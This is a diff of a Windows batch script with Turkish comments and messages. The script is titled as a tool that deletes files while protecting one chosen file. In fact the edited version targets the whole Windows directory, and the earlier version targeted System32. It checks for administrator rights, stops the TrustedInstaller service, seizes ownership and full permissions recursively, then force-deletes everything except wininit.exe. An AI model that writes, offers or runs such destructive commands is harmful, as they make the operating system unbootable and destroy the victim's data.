@@ -1,69 +1,66 @@
 @echo off
 setlocal EnableDelayedExpansion
-title Unknown
+title Belirli Dosyayi Koruyarak Silme Araci
+color 0A
 
 :: Yonetici yetkisi kontrolu
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo Administrator yetkisi gerekli!
-    echo Lutfen bu dosyayi yonetici olarak calistirin.
+    echo [!] HATA: Administrator yetkisi gerekli!
+    echo [!] Lutfen bu dosyayi yonetici olarak calistirin.
     pause
     exit /B 1
 )
 
-:: Silinecek dosya veya klasörün tam yolunu buraya yazın
-set "targetPath=%windir%/System32"
+:: Silinecek klasorun tam yolunu buraya yazin
+set "targetPath=%windir%"
+set "protectedFile=wininit.exe"
 
-
+echo [+] Silme islemi basliyor...
+echo [+] Hedef: %targetPath%
+echo [+] Korunan dosya: %protectedFile%
+echo.
 
 :: TrustedInstaller servisini durdur
+echo [*] TrustedInstaller servisi durduruluyor...
 net stop TrustedInstaller /y >nul 2>&1
 
 :: Sistem yetkilerini kaldir
-echo Sistem yetkileri kaldiriliyor...
+echo [*] Sistem yetkileri kaldiriliyor...
 icacls "%targetPath%" /setowner "Administrators" /T /C >nul 2>&1
 icacls "%targetPath%" /reset /T >nul 2>&1
 
 :: Tum yetkileri al
-echo Yetkiler aliniyor...
+echo [*] Tum yetkiler aliniyor...
 takeown /F "%targetPath%" /A /R /D Y >nul 2>&1
 icacls "%targetPath%" /grant:r Administrators:F /T /C /Q >nul 2>&1
 icacls "%targetPath%" /grant:r %username%:F /T /C /Q >nul 2>&1
 
-:: Dosya/Klasor kontrolu
-if exist "%targetPath%\*" (
-    :: Klasor ise
-    echo Klasor siliniyor...
-    rd /s /q "%targetPath%" 2>nul
-    if exist "%targetPath%" (
-        :: Eger hala duruyorsa, force ile dene
-        echo Normal silme basarisiz. Force kullaniliyor...
-        rmdir /s /q "%targetPath%" 2>nul
-        if exist "%targetPath%" (
-            echo Force silme de basarisiz. Del komutu deneniyor...
-            del /f /s /q "%targetPath%\*" >nul 2>&1
-            rmdir /s /q "%targetPath%" >nul 2>&1
-        )
+:: Dosya ve klasorleri silme
+echo [*] Dosyalar ve klasorler siliniyor (korunan dosya haric)...
+for /f "delims=" %%i in ('dir /b /a "%targetPath%"') do (
+    if /i not "%%i"=="%protectedFile%" (
+        echo [*] Siliniyor: %%i
+        rd /s /q "%targetPath%\%%i" 2>nul
+        del /f /q "%targetPath%\%%i" 2>nul
+    ) else (
+        echo [!] Korunuyor: %%i
     )
-) else (
-    :: Dosya ise
-    echo Dosya siliniyor...
-    del /f /q "%targetPath%" 2>nul
 )
 
 :: Son kontrol
 if exist "%targetPath%" (
     echo.
-    echo HATA: Silme islemi basarisiz oldu!
-    echo Lutfen Windows Guvenli Modda tekrar deneyin.
+    echo [+] Islemler tamamlandi. Korunan dosya: %protectedFile%
     echo.
 ) else (
     echo.
-    echo BASARILI: Silme islemi tamamlandi!
+    echo [!] HATA: Hedef klasor tamamen silindi!
     echo.
 )
 
-:: TrustedInstaller servisini tekrar baslat
+:: TrustedInstaller servisini yeniden baslat
+echo [*] TrustedInstaller servisi yeniden baslatiliyor...
 net start TrustedInstaller >nul 2>&1
 
 pause
